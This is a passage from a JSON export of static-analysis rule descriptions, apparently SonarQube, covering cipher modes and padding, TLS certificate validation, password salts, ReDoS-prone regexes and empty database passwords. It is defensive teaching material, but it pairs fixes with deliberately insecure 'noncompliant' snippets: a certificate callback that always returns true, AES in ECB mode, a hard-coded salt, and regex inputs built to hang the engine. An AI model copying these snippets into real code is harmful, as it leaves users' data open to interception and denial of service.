size, use one of the overloaded constructors with the desired key size instead.</p>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    AesManaged aes = new AesManaged\n    {\n        keysize = 128,\n        blocksize = 128,\n        mode = ciphermode.ecb,        // Noncompliant\n        padding = paddingmode.pkcs7\n    };\n}\n</pre>\n<p>Note that Microsoft has marked derived cryptographic types like <code>AesManaged</code> as no longer recommended for use.</p>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    RSACryptoServiceProvider RsaCsp = new RSACryptoServiceProvider();\n    byte[] encryptedData            = RsaCsp.Encrypt(dataToEncrypt, false); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    AesGcm aes = AesGcm(key);\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    RSACryptoServiceProvider RsaCsp = new RSACryptoServiceProvider();\n    byte[] encryptedData            = RsaCsp.Encrypt(dataToEncrypt, true);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>In the following example, the callback change impacts the entirety of HTTP requests made by the application.</p>\n<p>The certificate validation gets disabled by overriding <code>ServerCertificateValidationCallback</code> with an empty implementation. It is highly\nrecommended to use the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre>\nusing System.Net;\nusing System.Net.Http;\n\npublic static void connect()\n{\n    ServicePointManager.ServerCertificateValidationCallback +=\n\t (sender, certificate, chain, errors) =&gt; {\n\t     return true; // Noncompliant\n    };\n\n    HttpClient httpClient = new HttpClient();\n    HttpResponseMessage response = httpClient.GetAsync(\"https://example.com\").Result;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S2053": {
        "name": "Password hashing functions should use an unpredictable salt",
        "htmlDesc": "<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h3>Exceptions</h3>\n<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such\nfunctions are:</p>\n<ul>\n  <li> Argon2 </li>\n  <li> PBKDF2 </li>\n  <li> Scrypt </li>\n  <li> Bcrypt </li>\n</ul>\n<p>When they are used for password storage, using a secure, random salt is required.</p>\n<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those\ncases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed\nsalt is safe and accepted.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Security.Cryptography;\n\npublic static void hash(string password)\n{\n    var salt = Encoding.UTF8.GetBytes(\"salty\");\n    var hashed = new Rfc2898DeriveBytes(password, salt); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Security.Cryptography;\n\npublic static void hash(string password)\n{\n    var hashed = new Rfc2898DeriveBytes(password, 16);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>\n<p>In the case of the code sample, the class automatically takes care of generating a secure salt if none is specified.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5852": {
        "name": "Using slow regular expressions is security-sensitive",
        "htmlDesc": "<p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating\nan input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity\nof the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger\n<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too\nwith, in this case, a large carefully-crafted input (thousands chars).</p>\n<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>\n<p>Note that, due to improvements to the matching algorithm, some cases of exponential runtime complexity have become impossible when run using JDK 9\nor later. In such cases, an issue will only be reported if the project’s target Java version is 8 or earlier.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>\n<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can\nfail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>String.matches</code>), the end of the\nregex counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>\n<ul>\n  <li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different\n  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if\n  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only\n  one way to match it).\n    <ul>\n      <li> When using JDK 9 or later an optimization applies when the repetition is greedy and the entire regex does not contain any back references.\n      In that case the runtime will only be polynomial (in case of nested repetitions) or even linear (in case of alternations or optional parts).\n      </li>\n    </ul>  </li>\n  <li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional\n  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the\n  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different\n  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>.\n  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>\n  <li> If you’re performing a partial match (such as by using <code>Matcher.find</code>, <code>String.split</code>, <code>String.replaceAll</code>\n  etc.) and the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails,\n  the regex engine will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it’s followed by a\n  pattern that can fail, can cause quadratic runtime on some inputs. For example <code>str.split(\"\\\\s*,\")</code> will run in quadratic time on strings\n  that consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li>\n</ul>\n<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>\n<ul>\n  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>\n  for instance. </li>\n  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this\n  nested quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists\n  exactly one <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li>\n  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex\n  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>\n</ul>\n<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial\nmatches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>\n<ul>\n  <li> Solve the problem without regular expressions </li>\n  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href=\"https://github.com/google/re2\">RE2</a> or <a\n  href=\"https://github.com/google/re2j\">RE2/J</a>. </li>\n  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or\n  using multiple regular expressions. One example of this would be to replace <code>str.split(\"\\\\s*,\\\\s*\")</code> with <code>str.split(\",\")</code> and\n  then trimming the spaces from the strings as a second step. </li>\n  <li> When using <code>Matcher.find()</code>, it is often possible to make the regex infallible by making all the parts that could fail optional,\n  which will prevent backtracking. Of course this means that you’ll accept more strings than intended, but this can be handled by using capturing\n  groups to check whether the optional parts were matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code>\n  could be replaced with <code>x*(y)?</code> and then the call to <code>matcher.find()</code> could be replaced with <code>matcher.find() &amp;&amp;\n  matcher.group(1) != null</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>The first regex evaluation will never end in <code>JDK</code> &lt;= 9 and the second regex evaluation will never end in any versions of the\n<code>JDK</code>:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)+\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Sensitive\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)++\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Compliant\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a\n  href=\"https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S2115": {
        "name": "A secure password should be used when connecting to a database",
        "htmlDesc": "<p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>\n<h2>Why is this an issue?</h2>\n<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting\nthis vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication\ncredentials.</p>\n<h3>What is the potential impact?</h3>\n<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially\nleading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and\nintegrity of the database and the data it contains.</p>\n<h4>Unauthorized Access to Sensitive Data</h4>\n<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can\ninclude personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the\ndatabase. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to\nidentity theft, financial loss, or reputational damage.</p>\n<h4>Compromise of System Integrity</h4>\n<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the\nentire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,\nunauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the\norganization to further security risks.</p>\n<h4>Unwanted Modifications or Deletions</h4>\n<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a\nsignificant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For\nexample, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business\nprocesses and potentially leading to financial and legal consequences.</p>\n<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system\ncompromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain\nsystem integrity, and protect the organization from potential harm.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses an empty password to connect to a Postgres database.</p>\n<p>The vulnerability can be fixed by using a strong password retrieved from Properties. This <code>database.password</code> property is set during\ndeployment. Its value should be strong and different for each database.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\nConnection conn = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true\", \"login\", \"\"); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\nString password = System.getProperty(\"database.password\");\nConnection conn = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true\", \"login\", password);\n</pre>\n<h3>Pitfalls</h3>\n<h4>Hard-coded passwords</h4>\n<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.\nHere are a few reasons why it is not recommended:</p>\n<ol>\n  <li> Security Vulnerability: Hard-coded passwords can be easily 